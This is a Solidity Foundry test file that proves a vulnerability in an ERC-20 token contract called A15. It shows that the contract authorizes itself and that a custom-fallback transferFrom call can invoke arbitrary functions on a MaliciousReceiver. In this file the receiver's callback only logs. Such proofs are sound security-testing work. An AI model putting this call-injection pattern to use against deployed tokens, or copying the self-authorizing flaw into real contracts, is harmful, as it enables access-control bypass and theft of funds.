// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {A15} from "../../src/ERC-20s/A15.sol";

contract A15Test is Test {
    A15 public token;
    address public owner;
    address public attacker;

    function setUp() public {
        owner = address(this);
        attacker = makeAddr("attacker");

        token = new A15();
    }

    function test_VulnerabilityProof_ContractAuthorizesItself() public view {
        bytes4 emergencyStopSig = bytes4(keccak256("emergencyStop()"));

        // Contract should authorize itself
        bool isAuth = token.isAuthorized(address(token), emergencyStopSig);
        assertTrue(isAuth);

        console.log("VULNERABILITY CONFIRMED: Contract authorizes itself!");
        console.log("Contract address:", address(token));
        console.log("Is authorized:", isAuth);
    }

    function testProof_CustomFallbackBypass() public {
        uint256 transferAmount = 1000 * 10 ** 18;

        MaliciousReceiver malicious = new MaliciousReceiver(address(token));

        deal(address(token), attacker, 5000 * 10 ** 18);

        console.log("Before exploit:");
        console.log("Token owner:", token.owner());
        console.log("Malicious contract:", address(malicious));

        // Transfer with custom fallback that calls emergencyStop
        vm.prank(attacker);
        bytes memory data = abi.encodePacked("exploit data");

        bool success = token.transferFrom(
            attacker, address(malicious), transferAmount, data, "exploitCallback(address,uint256,bytes)"
        );

        assertTrue(success);

        console.log("VULNERABILITY PROVEN: Custom fallback executed!");
        console.log("Transfer successful:", success);
        console.log("Malicious contract received tokens:", token.balanceOf(address(malicious)));
    }

    function test_EmergencyStopBlocked() public {
        vm.prank(attacker);
        vm.expectRevert("Not authorized");
        token.emergencyStop();

        console.log("Direct emergencyStop correctly blocked for attacker");
    }

    function test_CanCallProtectedFunctions() public {
        address newOwner = makeAddr("newOwner");

        vm.prank(owner);
        token.setOwner(newOwner);

        assertEq(token.owner(), newOwner);

        console.log("Owner can call protected functions normally");
        console.log("New owner:", token.owner());
    }
}

contract MaliciousReceiver {
    A15 public token;

    constructor(address _token) {
        token = A15(_token);
    }

    function exploitCallback(address from, uint256 amount, bytes memory data) external pure {
        console.log("Malicious callback executed!");
        console.log("From:", from);
        console.log("Amount:", amount);
        console.log("Data length:", data.length);
    }
}
